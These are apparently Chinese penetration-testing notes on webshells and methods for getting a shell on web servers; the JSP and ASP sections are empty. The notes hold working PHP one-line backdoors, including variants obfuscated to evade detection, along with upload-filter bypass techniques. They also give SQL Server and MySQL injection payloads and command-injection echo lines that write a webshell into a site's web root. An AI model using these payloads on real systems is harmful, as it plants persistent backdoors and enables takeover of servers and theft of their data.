# Webshell
什么是webshell：一种可执行文件，但是其中包含外部用户输入接口（一般为get或者post等等），并且内部含有可执行函数，将用户输入转换为对应平台代码并且执行或者将用户输入当作命令执行


## PHP WebShell
### （1）默认webshell
首先是kali中默认存在的webshell
`/usr/share/webshells/php` 文件夹中包括php webshell
### （2）一句话webshell
*php4，php5，php7+可以使用eval函数*（eval函数会将输入的字符串当作php代码执行，并且返回执行结果）
`<?php eval($_POST['cmd']); ?>` cmd传入php代码
*php4，php5，php7.2以下可以使用assert函数*（assert函数会将用户输入当作php代码执行）
`<?php assert($_POST['cmd']); ?>` 
*php5使用print函数输出结果不是echo*
### （3）常用webshell
`<?php $a = str_replace(x,"","exxvxxxaxlxx");$a($_POST["cmd"]); ?>`
`<?php $k="e"."va"."l"; $k(${"_PO"."ST"} ['cmd']);?>`
`<?php $lang = (string)key($_POST);$lang($_POST['cmd']); ?>` 动态传参
`<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST["xindong"]);  ?>`
**php中执行命令行函数：**
* *system* 函数执行有回显，可将结果显示在页面上
`string system ( string $command [, int &$return_var ] );`   $command为执行的命令，&return_var可选，用来存放命令执行后的状态码
* *passthru* 执行有回显，可将执行结果显示在页面上
`void passthru ( string $command [, int &$return_var ] );`   和system函数类似，$command为执行的命令，&return_var可选，用来存放命令执行后的状态码
* *exec*  函数执行无回显，默认返回最后一行结果
`string exec ( string $command [, array &$output [, int &$return_var ]] );` \$command是要执行的命令 \$output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败）
* *shell_exec* 函数默认无回显，通过 echo 可将执行结果输出到页面
`string shell_exec( string &command);`



## JSP WebShell
**kali webshell**
首先kali中默认存在jsp webshell
`/usr/share/webshells/jsp`
**一句话**


## ASP/ASPX WebShell


# GetShell
## getshell方法总结
### （1）管理员拿shell
* 直接上传webshell获取目标控制
* 如果上传失败，多找模式或者性能设置，可以得到上传类型修改
* 如果没有明显上传路径，尝试有没有权限浏览上一级目录，可以将上传的文件改名，即改为 ../1.php（目录跳跃）
### （2）数据库备份拿shell
* 如果数据库具有备份功能，这时我们就可以将webshell格式先该为允许上传的文件格式如jpg，gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式
### （3）突破上传拿shell
* 一般配合解析漏洞上传
* 本地js验证绕过上传
* 服务器mime绕过上传
* 服务器白名单绕过上传
* 服务器黑名单绕过上传
* 服务器 filepath上传
* 双文件上传
* %00截断上传
### （4）网站配置插马拿shell（慎用，可能网站会奔溃）
* 通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该网站源码，进行查看源码过滤规则，以防插马失败。
### （5）通过编辑模板拿webshell
* 通过对网站的模板进行编辑写入一句话，然后生成脚本文件拿webshell。
* 通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿webshell
### （6）[[文件上传漏洞#上传突破|上传]]插件拿shell
* 一般将马与插件绑定在一起，不需要启动，只是知道马在哪就可以了，我们可以把木马添加到安装的插件中上传服务器拿shell
### （7）[[SQL注入漏洞|数据库]]执行拿webshell
* 我们可以通过数据库执行命令导出一句话到网站根目录拿shell，前提要知道网站根目录在哪
* [[SQL注入漏洞#Access数据库注入|access]] 数据库导出 一般需要利用解析漏洞xx.asp;.xml
* [[SQL注入漏洞#SqlServer数据库注入|sqlserver]] 导出
```sql
;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27<%execute(request("cmd"))%>%27%27%27-- 
```
* [[SQL注入漏洞#MySql数据库注入|mysql]]命令导出shell
```sql
Create TABLE study (cmd text NOT NULL);Insert INTO study (cmd) VALUES('<?php eval ($_POST[cmd]) ?>');select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';Drop TABLE IF EXISTS study;
```
* 如果没有权限执行[[SQL注入漏洞#权限利用|into outfile函数时]]，可以利用日志生成来注入马，前提是能修改日志位置
```sql
use mysql;create table x(packet text) type=MyISAM;insert into x (packet) values('<pre><body ><?php @system($_GET["cmd"]); ?></body></pre>');select x  into outfile 'd:\php\xx.php'
```
*其中mysql5.5之后`type=MyISAM`改为`ENGINE=MyISAM`*
### （8）[[命令注入漏洞#命令注入|命令执行]]拿shell
直接写入webshell到特定位置（一般先写小马）
```php
Echo ^<^?php @eval($_POST['cracer']);?^>^ > c:\1.php
Echo ^<^?php @eval($_POST['cracer']);?^>^ > c:\1.php
^<^%eval request("cracer")%^>^ > c:\1.php
```


